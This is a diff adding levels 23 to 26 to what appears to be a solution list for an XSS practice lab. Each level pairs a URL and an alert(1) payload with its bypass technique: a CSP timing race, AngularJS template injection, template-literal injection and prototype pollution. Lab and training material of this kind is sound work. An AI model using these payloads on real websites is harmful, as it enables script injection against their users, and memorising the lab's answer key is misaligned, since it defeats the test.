@@ -154,3 +154,28 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 - payload: `x-init=alert(1)`
 - context: Attribute injection context with quote escaping. Attacker injects the Alpine.js framework attribute `x-init=alert(1)` to trigger code execution on page initialization without needing single or double quotes.
 
+### modern-bypass-level23
+
+`/modern-bypass/level23/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+- payload: `<script>alert(1)</script>`
+- context: Meta CSP Pre-Execution Race condition. The query is reflected before the `<meta http-equiv="Content-Security-Policy" ...>` tag is parsed. The browser executes the injected script immediately before compiling and enforcing the CSP policy.
+
+### modern-bypass-level24
+
+`/modern-bypass/level24/?query=%7B%7Bconstructor.constructor(%27alert(1)%27)%28%29%7D%7D`
+- payload: `{{constructor.constructor('alert(1)')()}}`
+- context: Client-Side Template Injection (CSTI) under strict WAF. Backend WAF strips `<` and `>`, but the expression is evaluated as plain JavaScript inside the AngularJS framework container on the client-side.
+
+### modern-bypass-level25
+
+`/modern-bypass/level25/?query=%24%7Balert(1)%7D`
+- payload: `${alert(1)}`
+- context: ES6 JS Template Literal Injection. Reflection lands inside backtick-enclosed template string context. Although single/double quotes are escaped, attacker injects `${alert(1)}` placeholder dynamically executed by the browser engine.
+
+### modern-bypass-level26
+
+`/modern-bypass/level26/?config%5B__proto__%5D%5BscriptUrl%5D=data%3Atext%2Fjavascript%2Calert%281%29`
+- payload: `?config[__proto__][scriptUrl]=data:text/javascript,alert(1)`
+- context: Client-side recursive query parsing allows parameters to pollute `Object.prototype.scriptUrl`, triggering dynamic XSS when config loads.
+
+
